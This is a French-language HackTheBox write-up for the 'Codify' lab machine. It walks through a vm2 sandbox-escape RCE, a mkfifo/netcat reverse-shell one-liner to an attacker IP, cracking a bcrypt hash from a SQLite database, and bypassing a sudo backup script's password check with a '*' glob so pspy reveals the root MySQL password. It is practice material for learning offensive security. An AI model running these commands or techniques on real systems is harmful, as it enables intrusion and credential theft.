---
title: Codify - HacktheBox
date: 2024-04-15 02:01:30 +0000
description: Codify est une machine Linux simple qui comporte une application web permettant aux utilisateurs de tester du code Node.js. L'application utilise une bibliothèque `vm2` vulnérable, qui est utilisée pour exécuter du code à distance. L'énumération de la cible révèle une base de données SQLite contenant un hachage qui, une fois craqué, donne un accès SSH à la Box. Enfin, un script Bash vulnérable peut être exécuté avec des privilèges élevés pour révéler le mot de passe de l'utilisateur root, conduisant à un accès privilégié à la machine.

categories: [HacktheBox]
tags: [HTB, vm2, sudo]
image:
    path: https://i.ibb.co/kDd16rd/Copie-de-Manager.png
---


- **[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance

Pour commencer je fais un petit scan sur la Box avec `nmap`
```sh
└─# nmap -sV -Pn -p- --min-rate 3000 $ip
Host is up (0.76s latency).
Not shown: 65470 closed tcp ports (reset), 62 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Je trouve un site dans le port 80 avec comme domain `codify.htb` donc je vais l'ajouter dans le `/etc/hosts`
```sh
─# echo "$ip  $host" | tee -a /etc/hosts                                  
10.10.11.239  codify.htb
```

Dans le site je trouve qu'on me dit que : *La plateforme Codify permet aux utilisateurs d'écrire et d'exécuter du code Node.js en ligne, mais certaines limitations sont en place pour garantir la sécurité de la plateforme et de ses utilisateurs.*
Ensuite dans le `about` je trouve une ligne interessante qui index le libray `Vm2`
![About](https://i.ibb.co/qWLWFjX/vm2.png)

En cliquant sur le Lien je trouve le github et aussi dans `Security` je trouve `7` vulnerabilites critique, a l'aide duquel j'utilise cet [issue](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac) pour avoir un RCE.

![RCE](https://i.ibb.co/9brxYL8/vm2.png)

En l'exploitant et en faisant un `id` je trouve `uid=1001(svc) gid=1001(svc) groups=1001(svc)`

Maintenant je vais creer un reverse shell

```sh
execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.5 1337 >/tmp/f").toString();

$sudo rlwrap nc -lnvp 1337                      
listening on [any] 1337 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.239] 37202
bash: cannot set terminal process group (1266): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~$ 

```

### Mouvement Lateral
Dans le `/home` je trouve un autre utilisateur `joshua`. Donc je vais recolter des informations sur cet utilisateur.

```sh
svc@codify:/home$ ls
joshua svc

ls -la *
contact:
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12  2023 .
drwxr-xr-x 5 root root  4096 Sep 12  2023 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12  2023 tickets.db

```

Pour cela je me suis rendu dans le `/var/www` puis dans le `/contact` du serveur je trouve un `tickets.db`

```sh
sqlite3 tickets.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .table.tables
.tables
tickets  users  
sqlite> SELECTSELECT * FROM users;
SELECT * FROM users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite>
```

Je trouve donc un hash de l'utilisateur en question, alors je vais utiliser `hashcat` pour la cracker

```sh
# hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -o passwd.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2868/5800 MB (1024 MB allocatable), 8MCU
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
Time.Started.....: Mon Apr 15 02:26:15 2024 (42 secs)
Time.Estimated...: Mon Apr 15 02:26:57 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       34 H/s (7.18ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344387 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1344/14344387 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Candidate.Engine.: Device Generator
Candidates.#1....: rayray -> ranger
Hardware.Mon.#1..: Temp: 59c Util: 93%

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

Maintenant je vais me connecter au ssh avec ce creds

## Privilege Escalation

Je trouve un script bash que je peux lancer avec `root`.
```sh
joshua@codify:~$ cat user.txt 
9612c3391fcd75f14ea72c6f06e57e3a
joshua@codify:~$ 
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Bon, je vais d'abord lire le code et voir ce que ce script fait.

```sh
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

En lancant ce script avec l'utilisateur `root`, Le script nous demande un mot de passe qui est comparé à celui contenu dans `/root/.creds`. S'il correspond, il utilise le mot de passe pour se connecter à mysql et exécuter quelques commandes.

Comme c'est un script `bash` on peux essayer de bypasser la demande du mot de passe avec le caractere `*` pour selectionner tout et voir

```sh
joshua@codify:~$ sudo -u root /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

Ici on voit bien que tout est bon et c'est deja executer mais le probleme est qu'on voit les taches effectuer derriere ou les mot de passe qui sont entrer. Alors on va utiliser l'outil `pspy` pour voir ce qui se passe derriere.


>>pspy est un outil en ligne de commande conçu pour espionner les processus sans avoir besoin des autorisations `root`. Il vous permet de voir les commandes exécutées par d'autres utilisateurs, les tâches cron, etc. au fur et à mesure qu'elles s'exécutent. Il est idéal pour énumérer les systèmes Linux dans les CTF. Il est également idéal pour montrer à vos collègues pourquoi passer des secrets comme arguments sur la ligne de commande est une mauvaise idée. 
>{: .prompt-info }

```sh
joshua@codify:/tmp/priv$ ./pspy64 -f
2024/04/15 02:42:20 CMD: UID=0    PID=2625   | /bin/bash /opt/scripts/mysql-backup.sh                                                                     
2024/04/15 02:42:20 CMD: UID=0    PID=2624   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys  

```

Dans les taches executer je vois un mot de passe utiliser pour se connecter a la base de donnees `mySQL` sur le port `3306`. Alors je vais essayer cela pour acceder a l'utilisateur `root`

![Pwned](https://i.ibb.co/stLG714/pwned.png)

## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [ Vm2 Issue](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- [Pspy](https://github.com/DominicBreuker/pspy)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
